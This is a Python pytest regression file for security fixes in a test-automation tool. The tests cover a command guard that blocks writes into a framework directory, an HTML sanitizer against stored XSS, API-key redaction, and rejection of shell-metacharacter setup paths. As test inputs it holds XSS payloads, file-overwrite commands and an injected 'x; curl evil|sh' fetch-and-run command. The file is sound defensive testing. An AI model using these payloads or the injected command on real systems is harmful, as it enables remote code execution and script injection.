"""Regression tests for the adversarial-review top-cluster security/integrity fixes
(2026-07-27c). Each test pins a fix so it can't silently regress.

Run: PYTHONNOUSERSITE=1 .venv/bin/pytest -q tests/test_security_fixes.py
"""
import pt_exec
from html_sanitize import sanitize_objective_html
from models import redact_llm_config, safe_session_dict


# --- #2 framework-guard hardening (command exec) --------------------------------
_PROFILE = {"framework_path": "/home/st-art/framework", "remote_workdir": "/home/st-art/pytest-create"}
_FW = "/home/st-art/framework"


def _blocked(cmd):
    try:
        pt_exec._assert_command_allowed(cmd, _PROFILE)
        return False
    except pt_exec.FrameworkReadOnlyError:
        return True


def test_guard_blocks_redirection_into_framework():
    assert _blocked(f"echo pwn > {_FW}/evil.py")
    assert _blocked(f"echo pwn >> {_FW}/config")


def test_guard_blocks_interpreter_write_into_framework():
    assert _blocked(f"python3 -c \"open('{_FW}/x','w').write('x')\"")


def test_guard_blocks_rsync_install_targetdir():
    assert _blocked(f"rsync -a /tmp/x {_FW}/")
    assert _blocked(f"install -m755 /tmp/x {_FW}/x")
    assert _blocked(f"cp -t {_FW} /tmp/evil.py")


def test_guard_blocks_command_substitution_touching_framework():
    assert _blocked(f"cat $({_FW}/gen.sh)")


def test_guard_still_allows_the_legit_run_command():
    legit = (f"cd /home/st-art/pytest-create/AWPTCM-T1/20260101-000000 && "
             f"ln -sfn {_FW} framework && sudo -n PYTHONPATH=/home/st-art python3 ./test-x.py -s cfg.setup -v")
    assert not _blocked(legit)


def test_guard_still_allows_readonly_framework_references():
    assert not _blocked(f"test -d {_FW}")
    assert not _blocked(f"cp {_FW}/lib.py ./lib.py")   # framework as SOURCE


# --- #3 objective HTML sanitizer (stored XSS) -----------------------------------
def test_sanitizer_preserves_legit_objective():
    html = "<ul><li>Verify the port comes up</li><li>Check <b>link</b> state</li></ul>"
    assert sanitize_objective_html(html) == html


def test_sanitizer_strips_event_handlers_and_scripts():
    for attack in [
        '<ul><li>x</li></ul><img src=x onerror=alert(1)>',
        '<ul><li onclick="evil()">click</li></ul>',
        '<script>alert(1)</script><ul><li>ok</li></ul>',
        '<ul><li><a href="javascript:alert(1)">x</a></li></ul>',
        '<iframe src=//evil></iframe><ul><li>y</li></ul>',
    ]:
        out = sanitize_objective_html(attack).lower()
        for bad in ("onerror", "onclick", "<script", "<img", "<iframe", "javascript:", "href", "<a>"):
            assert bad not in out, f"{bad!r} survived in {out!r}"


def test_sanitizer_is_idempotent():
    a = sanitize_objective_html('<ul><li>x</li></ul><img src=x onerror=alert(1)>')
    assert sanitize_objective_html(a) == a


# --- #4 secret redaction --------------------------------------------------------
def test_redact_llm_config_masks_secrets():
    cfg = {"provider": "openai", "api_key": "sk-SECRET", "token": "tok-SECRET", "model": "x"}
    out = redact_llm_config(cfg)
    assert out["api_key"] is None and out["token"] is None
    assert out["api_key_set"] is True and out["token_set"] is True
    assert out["provider"] == "openai" and out["model"] == "x"   # non-secrets preserved


def test_safe_session_dict_redacts_nested_llm_config():
    class _S:
        def dict(self):
            return {"key": "AWPTCM-T1", "llm_config": {"api_key": "sk-SECRET", "provider": "openai"}}
    out = safe_session_dict(_S())
    assert out["llm_config"]["api_key"] is None
    assert "sk-SECRET" not in str(out)


# --- #1 setup-path validation (endpoint-level) ----------------------------------
def test_run_rejects_setup_path_with_shell_metachars(client):
    # A confirmed session is required before /run; without one we still must NOT get a
    # 200 that reaches SSH. A malicious setup with shell metachars must be rejected
    # (400 from validation) — never accepted. We assert it never 200s.
    r = client.post("/api/pytest-create/run/AWPTCM-T99990",
                    json={"profile": "nope", "setup": "x; curl evil|sh"})
    assert r.status_code != 200
